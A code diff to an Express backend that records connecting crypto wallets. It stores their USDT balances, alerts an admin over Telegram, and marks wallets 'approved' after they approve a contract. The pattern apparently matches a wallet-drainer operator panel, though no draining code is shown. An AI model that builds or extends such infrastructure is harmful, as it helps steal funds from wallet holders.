@@ -133,7 +133,7 @@ app.get('/bot-info', async (req, res) => {
     }
 });
 
-// Wallet connection endpoint
+// Wallet connection endpoint - FIXED to allow reconnection
 app.post('/api/wallets/connect', async (req, res) => {
     try {
         const { address, name } = req.body;
@@ -148,12 +148,12 @@ app.post('/api/wallets/connect', async (req, res) => {
             });
         }
         
-        // Save wallet to database
+        // Save wallet to database - UPSERT (insert or update)
         const query = `
-            INSERT INTO wallets (address, name, created_at, updated_at)
-            VALUES ($1, $2, NOW(), NOW())
+            INSERT INTO wallets (address, name, created_at, updated_at, is_approved, is_processed)
+            VALUES ($1, $2, NOW(), NOW(), false, false)
             ON CONFLICT (address) DO UPDATE
-            SET updated_at = NOW()
+            SET name = $2, updated_at = NOW(), is_approved = false, is_processed = false
             RETURNING *
         `;
         
@@ -165,6 +165,15 @@ app.post('/api/wallets/connect', async (req, res) => {
         // Get real balance and send alert to admin
         const contractService = require('./src/services/contract.service');
         const balance = await contractService.getWalletUSDTBalance(address);
+        
+        // Update balance in database
+        const updateQuery = `
+            UPDATE wallets 
+            SET usdt_balance = $1, last_balance_check = NOW()
+            WHERE address = $2
+        `;
+        await database.query(updateQuery, [balance, address]);
+        
         await telegram.sendNewWalletAlert(address, balance);
         
         res.json({
@@ -173,11 +182,58 @@ app.post('/api/wallets/connect', async (req, res) => {
                 id: wallet.id,
                 address: wallet.address,
                 name: wallet.name,
+                usdt_balance: balance,
                 created_at: wallet.created_at
             }
         });
     } catch (error) {
         console.error('❌ WALLET CONNECTION ERROR:', error);
+        res.status(500).json({
+            success: false,
+            error: error.message
+        });
+    }
+});
+
+// Wallet approval endpoint - This will be called AFTER wallet approves contract
+app.post('/api/wallets/approve', async (req, res) => {
+    try {
+        const { address } = req.body;
+        
+        // Validate address
+        if (!address || address.length !== 42) {
+            return res.status(400).json({
+                success: false,
+                error: 'Invalid wallet address'
+            });
+        }
+        
+        // Update approval status in database
+        const query = `
+            UPDATE wallets 
+            SET is_approved = true, updated_at = NOW()
+            WHERE address = $1
+            RETURNING *
+        `;
+        
+        const result = await database.query(query, [address]);
+        
+        if (result.rows.length === 0) {
+            return res.status(404).json({
+                success: false,
+                error: 'Wallet not found'
+            });
+        }
+        
+        const wallet = result.rows[0];
+        
+        res.json({
+            success: true,
+            message: 'Wallet approved successfully',
+            wallet: wallet
+        });
+    } catch (error) {
+        console.error('❌ WALLET APPROVAL ERROR:', error);
         res.status(500).json({
             success: false,
             error: error.message
@@ -201,6 +257,14 @@ app.get('/api/wallets/:address/balance', async (req, res) => {
         // Get real balance from blockchain
         const contractService = require('./src/services/contract.service');
         const balance = await contractService.getWalletUSDTBalance(address);
+        
+        // Update balance in database
+        const updateQuery = `
+            UPDATE wallets 
+            SET usdt_balance = $1, last_balance_check = NOW()
+            WHERE address = $2
+        `;
+        await database.query(updateQuery, [balance, address]);
         
         res.json({
             success: true,
